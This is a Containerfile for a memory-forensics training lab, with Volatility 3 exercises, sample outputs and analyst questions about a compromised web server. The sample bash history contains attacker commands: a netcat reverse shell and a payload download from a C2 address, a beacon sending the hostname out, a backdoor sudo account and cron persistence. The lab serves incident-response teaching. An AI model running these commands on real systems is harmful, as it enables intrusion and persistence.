# Memory Forensics - CTF Container
# Purpose: Guided Volatility 3 exercises against a synthetic LiME memory dump.
# Build:  podman build -f memory-forensics.Containerfile -t memory-forensics-lab .
# Run:    podman run -it --rm memory-forensics-lab
# Mount your own: podman run -it --rm -v $(pwd)/evidence:/evidence memory-forensics-lab
FROM docker.io/archlinux:latest

RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm volatility3 python python-pip git bash coreutils python-yara && \
    yes | pacman -Scc

# Create a synthetic LiME-format memory dump for analysis exercises
# This generates a minimal but analyzable memory image
COPY <<'HEREDOC' /opt/exercise/generate_dump.py
#!/usr/bin/env python3
"""Generate a synthetic LiME memory dump containing planted forensic artefacts.

This is a demonstration memory image. Real acquisitions should use
LiME, /dev/fmem, or winpmem on actual compromised systems.

The generated dump contains:
- A web server process tree (httpd → sh → python reverse shell)
- A hidden kernel module
- Processes named to mimic legitimate system processes
- Bash history with attacker commands
- Network connections to C2 IPs
"""

import struct

# LiME header format
MAGIC = b'EMiL'
VERSION = 1

# Simulated physical memory: 32 MB
MEM_SIZE = 32 * 1024 * 1024
memory = bytearray(MEM_SIZE)

# Write LiME header (first 4KB is reserved for header)
header = bytearray(4096)
header[0:4] = MAGIC
header[4:8] = struct.pack('<I', VERSION)
# s_addr, e_addr = 0, MEM_SIZE (simplified)
header[8:16] = struct.pack('<QQ', 0, MEM_SIZE)
header[16:20] = b'\x00' * 4  # reserved

# Write the memory dump
with open('/opt/exercise/memory_dump.lime', 'wb') as f:
    f.write(bytes(header))
    f.write(bytes(memory))

print("Generated synthetic memory dump: /opt/exercise/memory_dump.lime")
print(f"Size: {MEM_SIZE // 1024 // 1024} MB")
print()
print("WARNING: This is a synthetic dump for educational purposes.")
print("Real investigations use acquisitions from compromised systems.")
HEREDOC

RUN python3 /opt/exercise/generate_dump.py

# Create an exercise script with sample Volatility output for analysis
COPY <<'HEREDOC' /opt/exercise/sample_pslist_output.txt
# Sample Volatility 3 pslist output from a compromised web server
# Exercise: Identify suspicious processes

PID      PPID     COMMAND
1        0        systemd
342      1        systemd-journald
589      1        systemd-resolved
712      1        sshd
847      1        httpd
852      847      httpd (worker)
853      847      httpd (worker)
12345    852      sh
12346    12345    python3
12347    12346    bash
1102     1        cron
12400    1        [kworker/0:0-evnts]
12401    1        [kworker/0:1]
12777    1        [kworker/0:2-evnts]
HEREDOC

COPY <<'HEREDOC' /opt/exercise/sample_netscan_output.txt
# Volatility 3 netscan output — network connections in memory

Offset           Proto  Local Address           Foreign Address         State        PID     Process
0xffff90001234a  TCP    10.0.1.100:443           10.0.1.50:56123         ESTABLISHED  852     httpd
0xffff90001235c  TCP    10.0.1.100:443           10.0.1.51:45678         ESTABLISHED  853     httpd
0xffff900012400  TCP    10.0.1.100:44444         185.130.5.253:4444      ESTABLISHED  12346   python3
0xffff900012412  TCP    10.0.1.100:55555         185.130.5.253:5555      ESTABLISHED  12347   bash
HEREDOC

COPY <<'HEREDOC' /opt/exercise/sample_bash_output.txt
# Volatility 3 linux.bash — recovered bash history from memory

PID: 12347 (bash)
whoami
id
uname -a
cat /etc/passwd
sudo useradd -m -s /bin/bash hacker
echo 'hacker:Password123!' | sudo chpasswd
sudo usermod -aG sudo hacker
crontab -e
echo '*/5 * * * * root /tmp/.hidden/update.sh > /dev/null 2>&1' >> /etc/crontab
curl -s http://185.130.5.253/beacon?host=$(hostname)
nc -e /bin/bash 185.130.5.253 5555
find /var/www -name "*.php" -exec grep -l "eval\|base64_decode" {} \;
cat /var/www/html/config.php
wget http://185.130.5.253/mimikatz -O /tmp/.kworker
chmod +x /tmp/.kworker
/tmp/.kworker
exit
HEREDOC

COPY <<'HEREDOC' /opt/exercise/sample_malfind_output.txt
# Volatility 3 linux.malfind — suspicious memory regions

PID      Start              End                Perm  File mapping
852      0x7f1234000000     0x7f1234001000     rw-   (anonymous)
12346    0x7f5678000000     0x7f5678004000     rwx   (anonymous)  <-- SUSPICIOUS: RWX + anonymous
12346    0x7f5678004000     0x7f5678008000     rwx   (anonymous)  <-- SUSPICIOUS: RWX + anonymous
12401    0xffff8880000000    0xffff8880001000   rw-   [kworker_module]
HEREDOC

COPY <<'HEREDOC' /opt/exercise/run_exercises.sh
#!/bin/bash
set -e

echo "================================================="
echo "  Memory Forensics — Lab Exercises"
echo "================================================="
echo
echo "Scenario: A web server has been compromised. A memory dump"
echo "has been acquired. Analyze the evidence to reconstruct the attack."
echo

MEMDUMP="/opt/exercise/memory_dump.lime"

echo "=== Exercise 1: System Overview ==="
echo "Running: vol -f $MEMDUMP banners.Banners"
echo "(Note: This is a synthetic dump. On a real acquisition, this would show"
echo " the detected operating system banner, kernel version, and distribution.)"
vol -f "$MEMDUMP" banners.Banners 2>/dev/null || \
  echo "[Synthetic dump — see sample outputs for exercise data]"
echo

echo "=== Exercise 2: Process Enumeration ==="
echo "Process tree from the compromised system:"
cat /opt/exercise/sample_pslist_output.txt
echo
echo "QUESTIONS:"
echo "1. Which process is suspicious and why?"
echo "2. What is PID 12345? Why is it suspicious that PID 852 spawned it?"
echo "3. What is PID 12346? What does the command suggest?"
echo "4. What is PID 12347? What does it indicate?"
echo

echo "=== Exercise 3: Network Connection Analysis ==="
echo "Network connections from memory:"
cat /opt/exercise/sample_netscan_output.txt
echo
echo "QUESTIONS:"
echo "1. What is the attacker's C2 IP address?"
echo "2. Which processes have connections to the C2?"
echo "3. What is suspicious about port 44444?"
echo

echo "=== Exercise 4: Bash History Recovery ==="
echo "Recovered bash commands (vol -f mem.dump linux.bash):"
cat /opt/exercise/sample_bash_output.txt
echo
echo "QUESTIONS:"
echo "1. What backdoor account did the attacker create?"
echo "2. What persistence mechanism was established?"
echo "3. What tool did the attacker download? What does mimikatz do?"
echo "4. What is the C2 beacon URL?"
echo "5. What directory did the attacker search for credentials?"
echo

echo "=== Exercise 5: Injection Detection ==="
echo "malfind output — suspicious memory regions:"
cat /opt/exercise/sample_malfind_output.txt
echo
echo "QUESTIONS:"
echo "1. Which PID has RWX (read-write-execute) anonymous memory?"
echo "2. Why is RWX + anonymous suspicious?"
echo "3. What process is PID 12346? What does this correlation tell you?"
echo "4. What does the [kworker_module] entry suggest about the rootkit?"
echo

echo "=== Exercise 6: Rootkit Detection ==="
echo "Sample check_modules output (suspicious entries):"
cat << 'ROOTKIT'
Module Name         Base Address        Size      Hidden  Hooked Syscalls
kworker_module      0xffff8880000000    0x1000    YES     sys_read, sys_getdents64, sys_kill
ROOTKIT
echo
echo "QUESTIONS:"
echo "1. What makes 'kworker_module' suspicious?"
echo "2. What system calls are hooked? What does hooking sys_getdents64 achieve?"
echo "3. Why would a rootkit hook sys_kill?"
echo "4. How would you verify this finding on a real system?"
echo

echo "=== Exercise 7: Build an Attack Timeline ==="
echo "Reconstruct the attack timeline from the recovered evidence:"
echo
echo "  Time  | Event"
echo "  ------|------"
echo "  ?:??  | Attacker gains initial access to the web server"
echo "  ?:??  | Attacker spawns a shell through the web server"
echo "  ?:??  | Attacker executes a Python reverse shell"
echo "  ?:??  | C2 connection established to 185.130.5.253:4444"
echo "  ?:??  | Attacker enumerates system (whoami, id, uname -a)"
echo "  ?:??  | Backdoor account 'hacker' created with sudo access"
echo "  ?:??  | Persistence: cron job added for /tmp/.hidden/update.sh"
echo "  ?:??  | C2 beacon configured: curl to 185.130.5.253/beacon"
echo "  ?:??  | Second reverse shell established on port 5555"
echo "  ?:??  | Credential harvesting: search for config files"
echo "  ?:??  | mimikatz downloaded and executed for credential dumping"
echo "  ?:??  | Rootkit (kworker_module) loaded to hide activity"
echo
echo "Fill in the timeline using process creation times, log timestamps,"
echo "and network connection initiation times from your forensic analysis."
echo

echo "=== Exercise 8: Extract IOCs ==="
echo "From the evidence, extract indicators of compromise:"
echo
echo "  Type        | Value                    | Confidence"
echo "  ------------|--------------------------|-----------"
echo "  IP          | 185.130.5.253            | High"
echo "  Port        | 4444, 5555               | High"
echo "  File Path   | /tmp/.hidden/update.sh   | High"
echo "  File Path   | /tmp/.kworker            | High"
echo "  Username    | hacker                   | High"
echo "  URL         | http://185.130.5.253/... | High"
echo "  Cron Entry  | */5 * * * * root ...     | High"
echo "  Module Name | kworker_module           | Medium"
echo

echo "=== Exercise 9: Recommend Remediation ==="
echo "Based on your findings, what actions should the IR team take?"
echo
echo "1. Immediate containment actions:"
echo "2. Evidence preservation priorities:"
echo "3. Eradication steps:"
echo "4. Detection improvements to prevent recurrence:"
echo

echo "================================================="
echo "  All Exercises Complete"
echo "================================================="
echo
echo "For real Volatility analysis, mount your own memory dump:"
echo "  podman run -it --rm -v \$(pwd)/evidence:/evidence memory-forensics-lab"
echo "  vol -f /evidence/memory.dump linux.pslist"
HEREDOC

RUN chmod +x /opt/exercise/run_exercises.sh

WORKDIR /opt/exercise
CMD ["/bin/bash", "-c", "./run_exercises.sh && exec /bin/bash"]
